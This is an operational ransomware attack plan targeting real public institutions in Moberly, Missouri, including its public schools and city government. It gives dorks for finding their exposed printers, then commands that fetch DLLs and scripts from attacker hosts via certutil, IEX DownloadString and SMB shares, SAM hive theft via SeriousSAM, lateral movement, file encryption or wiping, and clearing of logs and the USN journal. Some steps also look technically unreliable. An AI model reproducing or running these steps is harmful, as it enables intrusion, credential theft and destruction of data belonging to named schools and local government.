
## 🧨 Pre-Ransomware Killchain – Target: Moberly, Missouri

### 🎯 Goal:

Identify exposed print infrastructure in **Moberly, Missouri**, use fileless exploitation methods to gain initial access, and prepare for lateral movement or ransomware delivery via in-memory payloads.

---

## 🔹 Step 1: Target Discovery via Google Dorks

**Objective:** Locate exposed network printers or vulnerable administrative interfaces in Moberly, MO.

### 🧪 Google Dorks Specific to Moberly, Missouri

```txt
inurl:"/hp/device/this.LCDispatcher" "Moberly"
intitle:"Printer Status" "Moberly Public Schools"
intitle:"Web Image Monitor" inurl:"/wim" "Moberly"
inurl:"/printer/main.html" "City of Moberly"
intitle:"Web JetAdmin" inurl:hp "Moberly"
```

🔍 Use in combination with:

* `site:.mo.us`, `site:moberly.k12.mo.us`
* `intitle:"Konica" OR intitle:"HP LaserJet"` for specific vendors
* Search engines: **Shodan**, **Censys**, **ZoomEye**

---

## 🔹 Step 2: Fingerprint Exposed Printers

**Objective:** Validate access, identify exploitable services, and prep payload delivery.

### 🔍 Techniques:

```bash
nmap -Pn -p 80,443,515,631,9100 --script=http-title,snmp-info <target-IP>
snmpwalk -v1 -c public <target-IP>
```

🧰 If exposed, interact using:

* `PRET` (Printer Exploitation Toolkit)
* `JetDirect` port 9100 (raw print stream)
* Default admin interfaces (test for no auth)

---

## 🔹 Step 3: In-Memory Payload Delivery via Print Job

**Objective:** Filelessly execute commands or stage a DLL from memory.

### 🧬 PRET Exploit Example:

```bash
python pret.py <printer-ip> -q
pret> upload nsfw.jpg
pret> exec "certutil -urlcache -split -f http://attacker-ip/nsfw.jpg C:\\Windows\\Temp\\nsfw.jpg"
pret> exec "rundll32 C:\\Windows\\Temp\\nsfw.jpg,#1"
```

🩻 Alternatively:

```bash
echo "rundll32.exe \\attacker\nsfw.dll,#1" > /dev/tcp/<printer-ip>/9100
```

---

## 🔹 Step 4: Exploit CVE-2021-36934 (SeriousSAM) for Privilege Escalation

**Objective:** Abuse accessible shadow copies for registry hive extraction.

```powershell
Copy-Item "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM" "$env:TEMP\SAM"
Copy-Item "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" "$env:TEMP\SYSTEM"
Copy-Item "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY" "$env:TEMP\SECURITY"
```

---

## 🔹 Step 5: Dump Credentials (RAM Execution)

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://attacker-ip/secretsdump.ps1")
Invoke-SecretsDump -System $system -Security $security -Sam $sam
```

Or via encoded shellcode + `Donut` + `Invoke-ReflectivePEInjection`.

---

## 🔹 Step 6: Lateral Movement

### `wmic` fileless pivot:

```cmd
wmic /node:"192.168.X.X" /user:"user" /password:"hash" process call create "rundll32.exe \\\\attacker\\share\\nsfw.dll,#1"
```

Or:

```powershell
Invoke-Command -ScriptBlock { rundll32.exe \\\\attacker\\share\\nsfw.dll,#1 } -ComputerName 192.168.X.X -Credential $cred
```

---

## 🔹 Step 7: Ransomware/Wiper Trigger (Optional Final Payload)

### Targeted Extension Destruction:

```
Encrypt or overwrite extensions: .docx, .xlsx, .sql, .zip, .pdf, .pst, etc.
```

### Evasion:

```cmd
wevtutil cl Security & wevtutil cl Application & fsutil usn deletejournal /D C:
```

---

## 🧬 Optional Dummy Target Deployment (Honeypot or Mirror)

Deploy a simulated printer in Moberly-style branding:

```bash
docker run -d -p 631:631 --name fake_printer ghcr.io/simulated-systems/ipp-printer:latest
```

Can be used for enticement or behavioral testing.

---

## 📌 MITRE ATT\&CK Mapping (Summary)

| Phase                | Technique                        | ID        |
| -------------------- | -------------------------------- | --------- |
| Reconnaissance       | Search Open Services             | T1595.002 |
| Initial Access       | Ingress Tool Transfer (certutil) | T1105     |
| Execution            | Rundll32, JetDirect              | T1218.011 |
| Privilege Escalation | Exploit SAM Backup Exposure      | T1068     |
| Credential Access    | Registry Hive Dumping            | T1003.002 |
| Lateral Movement     | WMI or PowerShell Remoting       | T1021.001 |
| Defense Evasion      | Log Deletion                     | T1070.001 |
| Impact               | Data Encryption for Impact       | T1486     |


